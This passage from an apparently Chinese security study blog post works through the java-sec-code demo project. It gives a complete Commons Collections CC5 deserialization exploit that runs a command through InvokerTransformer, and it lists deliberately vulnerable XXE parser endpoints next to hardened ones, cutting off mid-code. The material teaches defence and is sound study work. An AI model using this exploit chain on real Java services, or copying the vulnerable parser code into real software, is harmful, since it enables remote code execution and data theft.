class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by Fernflower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> org.apache.commons.collections.keyvalue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Map.Entry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.KeyValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title">Entry</span>, <span class="title">KeyValue</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">8453869361373831205L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object key;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TiedMapEntry</span><span class="params">(Map map, Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.map = map;</span><br><span class="line">        <span class="keyword">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Cannot set value to this map entry"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.map.put(<span class="keyword">this</span>.key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> Entry)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Entry other = (Entry)obj;</span><br><span class="line">            Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">this</span>.key == <span class="keyword">null</span> ? other.getKey() == <span class="keyword">null</span> : <span class="keyword">this</span>.key.equals(other.getKey())) &amp;&amp; (value == <span class="keyword">null</span> ? other.getValue() == <span class="keyword">null</span> : value.equals(other.getValue()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>.getKey() == <span class="keyword">null</span> ? <span class="number">0</span> : <span class="keyword">this</span>.getKey().hashCode()) ^ (value == <span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getKey() + <span class="string">"="</span> + <span class="keyword">this</span>.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它在调用toString()时,实际上调用了getValue()即map.get(key)。这样它就符合上面Lazymap的要求了。<br>那么gadget就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()<span class="comment">//其val为TiedMapEntry</span></span><br><span class="line">  =&gt;TiedMapEntry.toString()=&gt;TiedMapEntry.getValue()<span class="comment">//其map对象是LazyMap</span></span><br><span class="line">    =&gt;LazyMap.get()<span class="comment">//其factory对象是ChainedTransformer</span></span><br><span class="line">      =&gt;ChainedTransformer.transform()</span><br></pre></td></tr></table></figure><p>最终的exp.也是cc5的链子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class&#125;, new Object[] &#123;"calc"&#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="string">"1"</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, transformChain);</span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo233"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException exception = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field valField = exception.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valField.set(exception, entry);</span><br><span class="line"></span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"poc"</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(exception);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"poc"</span>));</span><br><span class="line">        in.readObject();  <span class="comment">// 触发漏洞</span></span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>done.</p><ul><li>防御机制</li></ul><p>从demo的安全代码部分就能看出。使用了AntObjectInputStream与InvalidClassException来进行黑/白名单的防范。具体可以看其自定义的代码 <a href="https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/security/AntObjectInputStream.java" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/security/AntObjectInputStream.java</a><br>直接Hook java/io/ObjectInputStream类的resolveClass方法</p><p>//今天先写这么多吧,好久没写java写起来还挺怀念的。</p><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>XXE在java-sec-code项目中被分为了两个部分。普通XXE与POI ooxml XXE.我们先从基础的看起。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> org.joychou.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.dom4j.DocumentHelper;</span><br><span class="line"><span class="keyword">import</span> org.dom4j.io.SAXReader;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Node;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.NodeList;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.helpers.XMLReaderFactory;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.XMLReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.SAXParserFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.SAXParser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.xml.sax.helpers.DefaultHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.digester3.Digester;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.input.SAXBuilder;</span><br><span class="line"><span class="keyword">import</span> org.joychou.util.WebUtils;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Java xxe vuln and security code.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> JoyChou @2017-12-22</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/xxe"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XXE</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Logger logger = LoggerFactory.getLogger(XXE<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String EXCEPT = <span class="string">"xxe except"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"/xmlReader/vuln"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">xmlReaderVuln</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line">            XMLReader xmlReader = XMLReaderFactory.createXMLReader();</span><br><span class="line">            xmlReader.parse(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body)));  <span class="comment">// parse xml</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"xmlReader xxe vuln code"</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/xmlReader/sec"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">xmlReaderSec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            XMLReader xmlReader = XMLReaderFactory.createXMLReader();</span><br><span class="line">            <span class="comment">// fix code start</span></span><br><span class="line">            xmlReader.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            xmlReader.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            xmlReader.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            <span class="comment">//fix code end</span></span><br><span class="line">            xmlReader.parse(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body)));  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"xmlReader xxe security code"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/SAXBuilder/vuln"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">SAXBuilderVuln</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXBuilder builder = <span class="keyword">new</span> SAXBuilder();</span><br><span class="line">            <span class="comment">// org.jdom2.Document document</span></span><br><span class="line">            builder.build(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body)));  <span class="comment">// cause xxe</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"SAXBuilder xxe vuln code"</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/SAXBuilder/sec"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">SAXBuilderSec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXBuilder builder = <span class="keyword">new</span> SAXBuilder();</span><br><span class="line">            builder.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            builder.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            builder.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            <span class="comment">// org.jdom2.Document document</span></span><br><span class="line">            builder.build(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body)));</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"SAXBuilder xxe security code"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/SAXReader/vuln"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">SAXReaderVuln</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXReader reader = <span class="keyword">new</span> SAXReader();</span><br><span class="line">            <span class="comment">// org.dom4j.Document document</span></span><br><span class="line">            reader.read(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body))); <span class="comment">// cause xxe</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"SAXReader xxe vuln code"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/SAXReader/sec"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">SAXReaderSec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> 